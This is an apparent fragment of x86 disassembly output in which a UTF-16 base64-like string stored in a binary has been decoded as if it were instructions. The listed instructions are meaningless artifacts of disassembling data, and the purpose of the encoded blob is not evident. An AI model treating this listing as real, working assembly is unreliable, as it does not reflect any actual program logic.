  407860:	00 46 00             	add    %al,0x0(%esi)
  407863:	50                   	push   %eax
  407864:	00 38                	add    %bh,(%eax)
  407866:	00 4a 00             	add    %cl,0x0(%edx)
  407869:	6e                   	outsb  %ds:(%esi),(%dx)
  40786a:	00 33                	add    %dh,(%ebx)
  40786c:	00 39                	add    %bh,(%ecx)
  40786e:	00 41 00             	add    %al,0x0(%ecx)
  407871:	75 00                	jne    0x407873
  407873:	59                   	pop    %ecx
  407874:	00 78 00             	add    %bh,0x0(%eax)
  407877:	4c                   	dec    %esp
  407878:	00 69 00             	add    %ch,0x0(%ecx)
  40787b:	6b 00 55             	imul   $0x55,(%eax),%eax
  40787e:	00 61 00             	add    %ah,0x0(%ecx)
  407881:	4f                   	dec    %edi
  407882:	00 5a 00             	add    %bl,0x0(%edx)
  407885:	6f                   	outsl  %ds:(%esi),(%dx)
  407886:	00 31                	add    %dh,(%ecx)
  407888:	00 68 00             	add    %ch,0x0(%eax)
  40788b:	4b                   	dec    %ebx
  40788c:	00 6d 00             	add    %ch,0x0(%ebp)
  40788f:	79 00                	jns    0x407891
  407891:	79 00                	jns    0x407893
  407893:	44                   	inc    %esp
  407894:	00 6a 00             	add    %ch,0x0(%edx)
  407897:	4d                   	dec    %ebp
  407898:	00 33                	add    %dh,(%ebx)
  40789a:	00 59 00             	add    %bl,0x0(%ecx)
  40789d:	38 00                	cmp    %al,(%eax)
  40789f:	33 00                	xor    (%eax),%eax
  4078a1:	77 00                	ja     0x4078a3
  4078a3:	35 00 62 00 2f       	xor    $0x2f006200,%eax
  4078a8:	00 70 00             	add    %dh,0x0(%eax)
  4078ab:	77 00                	ja     0x4078ad
  4078ad:	58                   	pop    %eax
  4078ae:	00 45 00             	add    %al,0x0(%ebp)
  4078b1:	70 00                	jo     0x4078b3
  4078b3:	4c                   	dec    %esp
  4078b4:	00 6b 00             	add    %ch,0x0(%ebx)
  4078b7:	45                   	inc    %ebp
  4078b8:	00 59 00             	add    %bl,0x0(%ecx)
  4078bb:	79 00                	jns    0x4078bd
  4078bd:	54                   	push   %esp
  4078be:	00 62 00             	add    %ah,0x0(%edx)
  4078c1:	4c                   	dec    %esp
  4078c2:	00 61 00             	add    %ah,0x0(%ecx)
  4078c5:	55                   	push   %ebp
  4078c6:	00 49 00             	add    %cl,0x0(%ecx)
  4078c9:	44                   	inc    %esp
  4078ca:	00 72 00             	add    %dh,0x0(%edx)
  4078cd:	77 00                	ja     0x4078cf
  4078cf:	6c                   	insb   (%dx),%es:(%edi)
  4078d0:	00 53 00             	add    %dl,0x0(%ebx)
  4078d3:	58                   	pop    %eax
  4078d4:	00 72 00             	add    %dh,0x0(%edx)
  4078d7:	4e                   	dec    %esi
  4078d8:	00 35 00 70 00 42    	add    %dh,0x42007000
  4078de:	00 52 00             	add    %dl,0x0(%edx)
  4078e1:	44                   	inc    %esp
  4078e2:	00 73 00             	add    %dh,0x0(%ebx)
  4078e5:	4e                   	dec    %esi
  4078e6:	00 65 00             	add    %ah,0x0(%ebp)
  4078e9:	67 00 77 00          	add    %dh,0x0(%bx)
  4078ed:	77 00                	ja     0x4078ef
  4078ef:	59                   	pop    %ecx
  4078f0:	00 36                	add    %dh,(%esi)
  4078f2:	00 62 00             	add    %ah,0x0(%edx)
  4078f5:	57                   	push   %edi
  4078f6:	00 61 00             	add    %ah,0x0(%ecx)
  4078f9:	33 00                	xor    (%eax),%eax
  4078fb:	38 00                	cmp    %al,(%eax)
  4078fd:	72 00                	jb     0x4078ff
  4078ff:	68 00 6c 00 58       	push   $0x58006c00
  407904:	00 61 00             	add    %ah,0x0(%ecx)
  407907:	55                   	push   %ebp
  407908:	00 61 00             	add    %ah,0x0(%ecx)
  40790b:	39 00                	cmp    %eax,(%eax)
  40790d:	34 00                	xor    $0x0,%al
  40790f:	4c                   	dec    %esp
  407910:	00 51 00             	add    %dl,0x0(%ecx)
  407913:	72 00                	jb     0x407915
  407915:	33 00                	xor    (%eax),%eax
  407917:	2f                   	das
  407918:	00 34 00             	add    %dh,(%eax,%eax,1)
  40791b:	4c                   	dec    %esp
  40791c:	00 71 00             	add    %dh,0x0(%ecx)
  40791f:	57                   	push   %edi
  407920:	00 41 00             	add    %al,0x0(%ecx)
  407923:	75 00                	jne    0x407925
  407925:	4b                   	dec    %ebx
  407926:	00 77 00             	add    %dh,0x0(%edi)
  407929:	41                   	inc    %ecx
  40792a:	00 43 00             	add    %al,0x0(%ebx)
  40792d:	53                   	push   %ebx
  40792e:	00 70 00             	add    %dh,0x0(%eax)
  407931:	7a 00                	jp     0x407933
  407933:	4d                   	dec    %ebp
  407934:	00 62 00             	add    %ah,0x0(%edx)
  407937:	73 00                	jae    0x407939
  407939:	53                   	push   %ebx
  40793a:	00 56 00             	add    %dl,0x0(%esi)
  40793d:	69 00 6d 00 55 00    	imul   $0x55006d,(%eax),%eax
  407943:	6e                   	outsb  %ds:(%esi),(%dx)
  407944:	00 76 00             	add    %dh,0x0(%esi)
  407947:	6a 00                	push   $0x0
  407949:	73 00                	jae    0x40794b
  40794b:	5a                   	pop    %edx
  40794c:	00 46 00             	add    %al,0x0(%esi)
  40794f:	70 00                	jo     0x407951
  407951:	68 00 4a 00 70       	push   $0x70004a00
  407956:	00 46 00             	add    %al,0x0(%esi)
  407959:	74 00                	je     0x40795b
  40795b:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40795f:	54                   	push   %esp
  407960:	00 31                	add    %dh,(%ecx)
  407962:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  407966:	00 61 00             	add    %ah,0x0(%ecx)
  407969:	69 00 39 00 43 00    	imul   $0x430039,(%eax),%eax
  40796f:	53                   	push   %ebx
  407970:	00 38                	add    %bh,(%eax)
  407972:	00 78 00             	add    %bh,0x0(%eax)
  407975:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407979:	73 00                	jae    0x40797b
  40797b:	42                   	inc    %edx
  40797c:	00 37                	add    %dh,(%edi)
  40797e:	00 66 00             	add    %ah,0x0(%esi)
  407981:	4c                   	dec    %esp
  407982:	00 46 00             	add    %al,0x0(%esi)
  407985:	73 00                	jae    0x407987
  407987:	33 00                	xor    (%eax),%eax
  407989:	45                   	inc    %ebp
  40798a:	00 6f 00             	add    %ch,0x0(%edi)
  40798d:	2f                   	das
  40798e:	00 30                	add    %dh,(%eax)
  407990:	00 35 00 30 00 70    	add    %dh,0x70003000
  407996:	00 6f 00             	add    %ch,0x0(%edi)
  407999:	59                   	pop    %ecx
  40799a:	00 48 00             	add    %cl,0x0(%eax)
  40799d:	7a 00                	jp     0x40799f
  40799f:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  4079a3:	5a                   	pop    %edx
  4079a4:	00 77 00             	add    %dh,0x0(%edi)
  4079a7:	4e                   	dec    %esi
  4079a8:	00 62 00             	add    %ah,0x0(%edx)
  4079ab:	79 00                	jns    0x4079ad
  4079ad:	59                   	pop    %ecx
  4079ae:	00 61 00             	add    %ah,0x0(%ecx)
  4079b1:	54                   	push   %esp
  4079b2:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  4079b6:	00 77 00             	add    %dh,0x0(%edi)
  4079b9:	77 00                	ja     0x4079bb
  4079bb:	38 00                	cmp    %al,(%eax)
  4079bd:	2f                   	das
  4079be:	00 34 00             	add    %dh,(%eax,%eax,1)
  4079c1:	4f                   	dec    %edi
  4079c2:	00 49 00             	add    %cl,0x0(%ecx)
  4079c5:	66 00 67 00          	data16 add %ah,0x0(%edi)
  4079c9:	57                   	push   %edi
  4079ca:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  4079ce:	00 77 00             	add    %dh,0x0(%edi)
  4079d1:	4b                   	dec    %ebx
  4079d2:	00 37                	add    %dh,(%edi)
  4079d4:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  4079d8:	00 45 00             	add    %al,0x0(%ebp)
  4079db:	4c                   	dec    %esp
  4079dc:	00 62 00             	add    %ah,0x0(%edx)
  4079df:	54                   	push   %esp
  4079e0:	00 73 00             	add    %dh,0x0(%ebx)
  4079e3:	49                   	dec    %ecx
  4079e4:	00 73 00             	add    %dh,0x0(%ebx)
  4079e7:	69 00 2f 00 6e 00    	imul   $0x6e002f,(%eax),%eax
  4079ed:	43                   	inc    %ebx
  4079ee:	00 34 00             	add    %dh,(%eax,%eax,1)
  4079f1:	4e                   	dec    %esi
  4079f2:	00 4f 00             	add    %cl,0x0(%edi)
  4079f5:	52                   	push   %edx
  4079f6:	00 34 00             	add    %dh,(%eax,%eax,1)
  4079f9:	71 00                	jno    0x4079fb
  4079fb:	50                   	push   %eax
  4079fc:	00 42 00             	add    %al,0x0(%edx)
  4079ff:	53                   	push   %ebx
  407a00:	00 57 00             	add    %dl,0x0(%edi)
  407a03:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	00 45 00             	add    %al,0x0(%ebp)
  407a0b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407a0f:	74 00                	je     0x407a11
  407a11:	30 00                	xor    %al,(%eax)
  407a13:	76 00                	jbe    0x407a15
  407a15:	4d                   	dec    %ebp
  407a16:	00 48 00             	add    %cl,0x0(%eax)
  407a19:	2b 00                	sub    (%eax),%eax
  407a1b:	46                   	inc    %esi
  407a1c:	00 6a 00             	add    %ch,0x0(%edx)
  407a1f:	71 00                	jno    0x407a21
  407a21:	6c                   	insb   (%dx),%es:(%edi)
  407a22:	00 50 00             	add    %dl,0x0(%eax)
  407a25:	32 00                	xor    (%eax),%al
  407a27:	7a 00                	jp     0x407a29
  407a29:	6c                   	insb   (%dx),%es:(%edi)
  407a2a:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  407a2e:	00 4e 00             	add    %cl,0x0(%esi)
  407a31:	49                   	dec    %ecx
  407a32:	00 48 00             	add    %cl,0x0(%eax)
  407a35:	71 00                	jno    0x407a37
  407a37:	4b                   	dec    %ebx
  407a38:	00 71 00             	add    %dh,0x0(%ecx)
  407a3b:	7a 00                	jp     0x407a3d
  407a3d:	6d                   	insl   (%dx),%es:(%edi)
  407a3e:	00 77 00             	add    %dh,0x0(%edi)
  407a41:	51                   	push   %ecx
  407a42:	00 51 00             	add    %dl,0x0(%ecx)
  407a45:	52                   	push   %edx
  407a46:	00 72 00             	add    %dh,0x0(%edx)
  407a49:	32 00                	xor    (%eax),%al
  407a4b:	76 00                	jbe    0x407a4d
  407a4d:	58                   	pop    %eax
  407a4e:	00 63 00             	add    %ah,0x0(%ebx)
  407a51:	35 00 35 00 35       	xor    $0x35003500,%eax
  407a56:	00 48 00             	add    %cl,0x0(%eax)
  407a59:	55                   	push   %ebp
  407a5a:	00 39                	add    %bh,(%ecx)
  407a5c:	00 61 00             	add    %ah,0x0(%ecx)
  407a5f:	57                   	push   %edi
  407a60:	00 61 00             	add    %ah,0x0(%ecx)
  407a63:	33 00                	xor    (%eax),%eax
  407a65:	4c                   	dec    %esp
  407a66:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  407a6a:	00 39                	add    %bh,(%ecx)
  407a6c:	00 75 00             	add    %dh,0x0(%ebp)
  407a6f:	67 00 2b             	add    %ch,(%bp,%di)
  407a72:	00 33                	add    %dh,(%ebx)
  407a74:	00 67 00             	add    %ah,0x0(%edi)
  407a77:	73 00                	jae    0x407a79
  407a79:	2f                   	das
  407a7a:	00 72 00             	add    %dh,0x0(%edx)
  407a7d:	57                   	push   %edi
  407a7e:	00 57 00             	add    %dl,0x0(%edi)
  407a81:	4d                   	dec    %ebp
  407a82:	00 6e 00             	add    %ch,0x0(%esi)
  407a85:	63 00                	arpl   %eax,(%eax)
  407a87:	49                   	dec    %ecx
  407a88:	00 55 00             	add    %dl,0x0(%ebp)
  407a8b:	49                   	dec    %ecx
  407a8c:	00 7a 00             	add    %bh,0x0(%edx)
  407a8f:	31 00                	xor    %eax,(%eax)
  407a91:	77 00                	ja     0x407a93
  407a93:	58                   	pop    %eax
  407a94:	00 30                	add    %dh,(%eax)
  407a96:	00 65 00             	add    %ah,0x0(%ebp)
  407a99:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  407a9d:	6c                   	insb   (%dx),%es:(%edi)
  407a9e:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  407aa2:	00 4d 00             	add    %cl,0x0(%ebp)
  407aa5:	45                   	inc    %ebp
  407aa6:	00 52 00             	add    %dl,0x0(%edx)
  407aa9:	46                   	inc    %esi
  407aaa:	00 70 00             	add    %dh,0x0(%eax)
  407aad:	4f                   	dec    %edi
  407aae:	00 35 00 52 00 36    	add    %dh,0x36005200
  407ab4:	00 4d 00             	add    %cl,0x0(%ebp)
  407ab7:	4b                   	dec    %ebx
  407ab8:	00 4f 00             	add    %cl,0x0(%edi)
  407abb:	30 00                	xor    %al,(%eax)
  407abd:	38 00                	cmp    %al,(%eax)
  407abf:	6c                   	insb   (%dx),%es:(%edi)
  407ac0:	00 76 00             	add    %dh,0x0(%esi)
  407ac3:	53                   	push   %ebx
  407ac4:	00 2b                	add    %ch,(%ebx)
  407ac6:	00 78 00             	add    %bh,0x0(%eax)
  407ac9:	57                   	push   %edi
  407aca:	00 58 00             	add    %bl,0x0(%eax)
  407acd:	58                   	pop    %eax
  407ace:	00 59 00             	add    %bl,0x0(%ecx)
  407ad1:	57                   	push   %edi
  407ad2:	00 6e 00             	add    %ch,0x0(%esi)
  407ad5:	4b                   	dec    %ebx
  407ad6:	00 70 00             	add    %dh,0x0(%eax)
  407ad9:	70 00                	jo     0x407adb
  407adb:	47                   	inc    %edi
  407adc:	00 32                	add    %dh,(%edx)
  407ade:	00 63 00             	add    %ah,0x0(%ebx)
  407ae1:	31 00                	xor    %eax,(%eax)
  407ae3:	44                   	inc    %esp
  407ae4:	00 48 00             	add    %cl,0x0(%eax)
  407ae7:	7a 00                	jp     0x407ae9
  407ae9:	6b 00 58             	imul   $0x58,(%eax),%eax
  407aec:	00 57 00             	add    %dl,0x0(%edi)
  407aef:	4f                   	dec    %edi
  407af0:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  407af4:	00 30                	add    %dh,(%eax)
  407af6:	00 34 00             	add    %dh,(%eax,%eax,1)
  407af9:	4d                   	dec    %ebp
  407afa:	00 69 00             	add    %ch,0x0(%ecx)
  407afd:	79 00                	jns    0x407aff
  407aff:	4d                   	dec    %ebp
  407b00:	00 5a 00             	add    %bl,0x0(%edx)
  407b03:	78 00                	js     0x407b05
  407b05:	49                   	dec    %ecx
  407b06:	00 4d 00             	add    %cl,0x0(%ebp)
  407b09:	47                   	inc    %edi
  407b0a:	00 70 00             	add    %dh,0x0(%eax)
  407b0d:	62 00                	bound  %eax,(%eax)
  407b0f:	39 00                	cmp    %eax,(%eax)
  407b11:	44                   	inc    %esp
  407b12:	00 62 00             	add    %ah,0x0(%edx)
  407b15:	77 00                	ja     0x407b17
  407b17:	57                   	push   %edi
  407b18:	00 2b                	add    %ch,(%ebx)
  407b1a:	00 59 00             	add    %bl,0x0(%ecx)
  407b1d:	68 00 6d 00 41       	push   $0x41006d00
  407b22:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  407b26:	00 30                	add    %dh,(%eax)
  407b28:	00 5a 00             	add    %bl,0x0(%edx)
  407b2b:	71 00                	jno    0x407b2d
  407b2d:	2b 00                	sub    (%eax),%eax
  407b2f:	79 00                	jns    0x407b31
  407b31:	32 00                	xor    (%eax),%al
  407b33:	4f                   	dec    %edi
  407b34:	00 52 00             	add    %dl,0x0(%edx)
  407b37:	44                   	inc    %esp
  407b38:	00 47 00             	add    %al,0x0(%edi)
  407b3b:	42                   	inc    %edx
  407b3c:	00 2f                	add    %ch,(%edi)
  407b3e:	00 39                	add    %bh,(%ecx)
  407b40:	00 68 00             	add    %ch,0x0(%eax)
  407b43:	39 00                	cmp    %eax,(%eax)
  407b45:	34 00                	xor    $0x0,%al
  407b47:	74 00                	je     0x407b49
  407b49:	35 00 4a 00 4b       	xor    $0x4b004a00,%eax
  407b4e:	00 55 00             	add    %dl,0x0(%ebp)
  407b51:	7a 00                	jp     0x407b53
  407b53:	63 00                	arpl   %eax,(%eax)
  407b55:	37                   	aaa
  407b56:	00 6e 00             	add    %ch,0x0(%esi)
  407b59:	30 00                	xor    %al,(%eax)
  407b5b:	52                   	push   %edx
  407b5c:	00 4b 00             	add    %cl,0x0(%ebx)
  407b5f:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  407b63:	44                   	inc    %esp
  407b64:	00 72 00             	add    %dh,0x0(%edx)
  407b67:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  407b6b:	50                   	push   %eax
  407b6c:	00 63 00             	add    %ah,0x0(%ebx)
  407b6f:	37                   	aaa
  407b70:	00 2f                	add    %ch,(%edi)
  407b72:	00 49 00             	add    %cl,0x0(%ecx)
  407b75:	47                   	inc    %edi
  407b76:	00 68 00             	add    %ch,0x0(%eax)
  407b79:	48                   	dec    %eax
  407b7a:	00 43 00             	add    %al,0x0(%ebx)
  407b7d:	67 00 55 00          	add    %dl,0x0(%di)
  407b81:	39 00                	cmp    %eax,(%eax)
  407b83:	51                   	push   %ecx
  407b84:	00 6a 00             	add    %ch,0x0(%edx)
  407b87:	69 00 6e 00 4b 00    	imul   $0x4b006e,(%eax),%eax
  407b8d:	44                   	inc    %esp
  407b8e:	00 39                	add    %bh,(%ecx)
  407b90:	00 39                	add    %bh,(%ecx)
  407b92:	00 4e 00             	add    %cl,0x0(%esi)
  407b95:	33 00                	xor    (%eax),%eax
  407b97:	30 00                	xor    %al,(%eax)
  407b99:	74 00                	je     0x407b9b
  407b9b:	35 00 4b 00 6b       	xor    $0x6b004b00,%eax
  407ba0:	00 32                	add    %dh,(%edx)
  407ba2:	00 37                	add    %dh,(%edi)
  407ba4:	00 6e 00             	add    %ch,0x0(%esi)
  407ba7:	47                   	inc    %edi
  407ba8:	00 45 00             	add    %al,0x0(%ebp)
  407bab:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  407baf:	34 00                	xor    $0x0,%al
  407bb1:	49                   	dec    %ecx
  407bb2:	00 31                	add    %dh,(%ecx)
  407bb4:	00 6a 00             	add    %ch,0x0(%edx)
  407bb7:	33 00                	xor    (%eax),%eax
  407bb9:	7a 00                	jp     0x407bbb
  407bbb:	32 00                	xor    (%eax),%al
  407bbd:	41                   	inc    %ecx
  407bbe:	00 5a 00             	add    %bl,0x0(%edx)
  407bc1:	44                   	inc    %esp
  407bc2:	00 71 00             	add    %dh,0x0(%ecx)
  407bc5:	6b 00 56             	imul   $0x56,(%eax),%eax
  407bc8:	00 57 00             	add    %dl,0x0(%edi)
  407bcb:	34 00                	xor    $0x0,%al
  407bcd:	78 00                	js     0x407bcf
  407bcf:	52                   	push   %edx
  407bd0:	00 47 00             	add    %al,0x0(%edi)
  407bd3:	6d                   	insl   (%dx),%es:(%edi)
  407bd4:	00 4e 00             	add    %cl,0x0(%esi)
  407bd7:	55                   	push   %ebp
  407bd8:	00 65 00             	add    %ah,0x0(%ebp)
  407bdb:	72 00                	jb     0x407bdd
  407bdd:	7a 00                	jp     0x407bdf
  407bdf:	64 00 2b             	add    %ch,%fs:(%ebx)
  407be2:	00 36                	add    %dh,(%esi)
  407be4:	00 6d 00             	add    %ch,0x0(%ebp)
  407be7:	66 00 43 00          	data16 add %al,0x0(%ebx)
  407beb:	30 00                	xor    %al,(%eax)
  407bed:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407bf1:	45                   	inc    %ebp
  407bf2:	00 72 00             	add    %dh,0x0(%edx)
  407bf5:	6f                   	outsl  %ds:(%esi),(%dx)
  407bf6:	00 77 00             	add    %dh,0x0(%edi)
  407bf9:	42                   	inc    %edx
  407bfa:	00 72 00             	add    %dh,0x0(%edx)
  407bfd:	58                   	pop    %eax
  407bfe:	00 50 00             	add    %dl,0x0(%eax)
  407c01:	2f                   	das
  407c02:	00 63 00             	add    %ah,0x0(%ebx)
  407c05:	79 00                	jns    0x407c07
  407c07:	71 00                	jno    0x407c09
  407c09:	4a                   	dec    %edx
  407c0a:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  407c0e:	00 58 00             	add    %bl,0x0(%eax)
  407c11:	61                   	popa
  407c12:	00 49 00             	add    %cl,0x0(%ecx)
  407c15:	32 00                	xor    (%eax),%al
  407c17:	49                   	dec    %ecx
  407c18:	00 67 00             	add    %ah,0x0(%edi)
  407c1b:	70 00                	jo     0x407c1d
  407c1d:	68 00 79 00 69       	push   $0x69007900
  407c22:	00 37                	add    %dh,(%edi)
  407c24:	00 63 00             	add    %ah,0x0(%ebx)
  407c27:	6e                   	outsb  %ds:(%esi),(%dx)
  407c28:	00 4f 00             	add    %cl,0x0(%edi)
  407c2b:	41                   	inc    %ecx
  407c2c:	00 43 00             	add    %al,0x0(%ebx)
  407c2f:	39 00                	cmp    %eax,(%eax)
  407c31:	4b                   	dec    %ebx
  407c32:	00 45 00             	add    %al,0x0(%ebp)
  407c35:	6b 00 34             	imul   $0x34,(%eax),%eax
  407c38:	00 35 00 4a 00 70    	add    %dh,0x70004a00
  407c3e:	00 31                	add    %dh,(%ecx)
  407c40:	00 55 00             	add    %dl,0x0(%ebp)
  407c43:	70 00                	jo     0x407c45
  407c45:	6b 00 35             	imul   $0x35,(%eax),%eax
  407c48:	00 41 00             	add    %al,0x0(%ecx)
  407c4b:	45                   	inc    %ebp
  407c4c:	00 4a 00             	add    %cl,0x0(%edx)
  407c4f:	48                   	dec    %eax
  407c50:	00 73 00             	add    %dh,0x0(%ebx)
  407c53:	48                   	dec    %eax
  407c54:	00 68 00             	add    %ch,0x0(%eax)
  407c57:	52                   	push   %edx
  407c58:	00 62 00             	add    %ah,0x0(%edx)
  407c5b:	48                   	dec    %eax
  407c5c:	00 32                	add    %dh,(%edx)
  407c5e:	00 41 00             	add    %al,0x0(%ecx)
  407c61:	36 00 30             	add    %dh,%ss:(%eax)
  407c64:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  407c68:	00 50 00             	add    %dl,0x0(%eax)
  407c6b:	44                   	inc    %esp
  407c6c:	00 55 00             	add    %dl,0x0(%ebp)
  407c6f:	77 00                	ja     0x407c71
  407c71:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  407c75:	51                   	push   %ecx
  407c76:	00 56 00             	add    %dl,0x0(%esi)
  407c79:	62 00                	bound  %eax,(%eax)
  407c7b:	4b                   	dec    %ebx
  407c7c:	00 6d 00             	add    %ch,0x0(%ebp)
  407c7f:	73 00                	jae    0x407c81
  407c81:	67 00 30             	add    %dh,(%bx,%si)
  407c84:	00 47 00             	add    %al,0x0(%edi)
  407c87:	33 00                	xor    (%eax),%eax
  407c89:	43                   	inc    %ebx
  407c8a:	00 4b 00             	add    %cl,0x0(%ebx)
  407c8d:	41                   	inc    %ecx
  407c8e:	00 57 00             	add    %dl,0x0(%edi)
  407c91:	77 00                	ja     0x407c93
  407c93:	44                   	inc    %esp
  407c94:	00 36                	add    %dh,(%esi)
  407c96:	00 50 00             	add    %dl,0x0(%eax)
  407c99:	63 00                	arpl   %eax,(%eax)
  407c9b:	35 00 4f 00 4f       	xor    $0x4f004f00,%eax
  407ca0:	00 32                	add    %dh,(%edx)
  407ca2:	00 79 00             	add    %bh,0x0(%ecx)
  407ca5:	4e                   	dec    %esi
  407ca6:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  407caa:	00 59 00             	add    %bl,0x0(%ecx)
  407cad:	79 00                	jns    0x407caf
  407caf:	63 00                	arpl   %eax,(%eax)
  407cb1:	49                   	dec    %ecx
  407cb2:	00 77 00             	add    %dh,0x0(%edi)
  407cb5:	73 00                	jae    0x407cb7
  407cb7:	75 00                	jne    0x407cb9
  407cb9:	31 00                	xor    %eax,(%eax)
  407cbb:	6e                   	outsb  %ds:(%esi),(%dx)
  407cbc:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  407cc0:	00 58 00             	add    %bl,0x0(%eax)
  407cc3:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  407cc7:	55                   	push   %ebp
  407cc8:	00 6d 00             	add    %ch,0x0(%ebp)
  407ccb:	53                   	push   %ebx
  407ccc:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  407cd0:	00 4a 00             	add    %cl,0x0(%edx)
  407cd3:	6b 00 47             	imul   $0x47,(%eax),%eax
  407cd6:	00 34 00             	add    %dh,(%eax,%eax,1)
  407cd9:	31 00                	xor    %eax,(%eax)
  407cdb:	69 00 43 00 61 00    	imul   $0x610043,(%eax),%eax
  407ce1:	58                   	pop    %eax
  407ce2:	00 71 00             	add    %dh,0x0(%ecx)
  407ce5:	66 00 70 00          	data16 add %dh,0x0(%eax)
  407ce9:	79 00                	jns    0x407ceb
  407ceb:	66 00 52 00          	data16 add %dl,0x0(%edx)
  407cef:	76 00                	jbe    0x407cf1
  407cf1:	73 00                	jae    0x407cf3
  407cf3:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  407cf7:	4a                   	dec    %edx
  407cf8:	00 45 00             	add    %al,0x0(%ebp)
  407cfb:	55                   	push   %ebp
  407cfc:	00 4e 00             	add    %cl,0x0(%esi)
  407cff:	76 00                	jbe    0x407d01
  407d01:	50                   	push   %eax
  407d02:	00 4d 00             	add    %cl,0x0(%ebp)
  407d05:	38 00                	cmp    %al,(%eax)
  407d07:	2f                   	das
  407d08:	00 73 00             	add    %dh,0x0(%ebx)
  407d0b:	4f                   	dec    %edi
  407d0c:	00 71 00             	add    %dh,0x0(%ecx)
  407d0f:	4c                   	dec    %esp
  407d10:	00 76 00             	add    %dh,0x0(%esi)
  407d13:	67 00 42 00          	add    %al,0x0(%bp,%si)
  407d17:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  407d1b:	72 00                	jb     0x407d1d
  407d1d:	30 00                	xor    %al,(%eax)
  407d1f:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  407d23:	4c                   	dec    %esp
  407d24:	00 6e 00             	add    %ch,0x0(%esi)
  407d27:	50                   	push   %eax
  407d28:	00 31                	add    %dh,(%ecx)
  407d2a:	00 4b 00             	add    %cl,0x0(%ebx)
  407d2d:	4d                   	dec    %ebp
  407d2e:	00 50 00             	add    %dl,0x0(%eax)
  407d31:	4a                   	dec    %edx
  407d32:	00 72 00             	add    %dh,0x0(%edx)
  407d35:	32 00                	xor    (%eax),%al
  407d37:	2f                   	das
  407d38:	00 72 00             	add    %dh,0x0(%edx)
  407d3b:	75 00                	jne    0x407d3d
  407d3d:	37                   	aaa
  407d3e:	00 34 00             	add    %dh,(%eax,%eax,1)
  407d41:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  407d45:	46                   	inc    %esi
  407d46:	00 78 00             	add    %bh,0x0(%eax)
  407d49:	69 00 37 00 51 00    	imul   $0x510037,(%eax),%eax
  407d4f:	2b 00                	sub    (%eax),%eax
  407d51:	4a                   	dec    %edx
  407d52:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  407d56:	00 55 00             	add    %dl,0x0(%ebp)
  407d59:	4d                   	dec    %ebp
  407d5a:	00 75 00             	add    %dh,0x0(%ebp)
  407d5d:	6c                   	insb   (%dx),%es:(%edi)
  407d5e:	00 6b 00             	add    %ch,0x0(%ebx)
  407d61:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  407d65:	78 00                	js     0x407d67
  407d67:	62 00                	bound  %eax,(%eax)
  407d69:	47                   	inc    %edi
  407d6a:	00 34 00             	add    %dh,(%eax,%eax,1)
  407d6d:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  407d71:	55                   	push   %ebp
  407d72:	00 6b 00             	add    %ch,0x0(%ebx)
  407d75:	56                   	push   %esi
  407d76:	00 52 00             	add    %dl,0x0(%edx)
  407d79:	4b                   	dec    %ebx
  407d7a:	00 2f                	add    %ch,(%edi)
  407d7c:	00 41 00             	add    %al,0x0(%ecx)
  407d7f:	55                   	push   %ebp
  407d80:	00 6d 00             	add    %ch,0x0(%ebp)
  407d83:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  407d87:	6f                   	outsl  %ds:(%esi),(%dx)
  407d88:	00 50 00             	add    %dl,0x0(%eax)
  407d8b:	6a 00                	push   $0x0
  407d8d:	41                   	inc    %ecx
  407d8e:	00 33                	add    %dh,(%ebx)
  407d90:	00 62 00             	add    %ah,0x0(%edx)
  407d93:	68 00 59 00 78       	push   $0x78005900
  407d98:	00 58 00             	add    %bl,0x0(%eax)
  407d9b:	78 00                	js     0x407d9d
  407d9d:	74 00                	je     0x407d9f
  407d9f:	4f                   	dec    %edi
  407da0:	00 70 00             	add    %dh,0x0(%eax)
  407da3:	75 00                	jne    0x407da5
  407da5:	46                   	inc    %esi
  407da6:	00 31                	add    %dh,(%ecx)
  407da8:	00 71 00             	add    %dh,0x0(%ecx)
  407dab:	44                   	inc    %esp
  407dac:	00 34 00             	add    %dh,(%eax,%eax,1)
  407daf:	2f                   	das
  407db0:	00 2f                	add    %ch,(%edi)
  407db2:	00 56 00             	add    %dl,0x0(%esi)
  407db5:	37                   	aaa
  407db6:	00 52 00             	add    %dl,0x0(%edx)
  407db9:	62 00                	bound  %eax,(%eax)
  407dbb:	5a                   	pop    %edx
  407dbc:	00 2b                	add    %ch,(%ebx)
  407dbe:	00 45 00             	add    %al,0x0(%ebp)
  407dc1:	38 00                	cmp    %al,(%eax)
  407dc3:	49                   	dec    %ecx
  407dc4:	00 61 00             	add    %ah,0x0(%ecx)
  407dc7:	76 00                	jbe    0x407dc9
  407dc9:	75 00                	jne    0x407dcb
  407dcb:	79 00                	jns    0x407dcd
  407dcd:	4a                   	dec    %edx
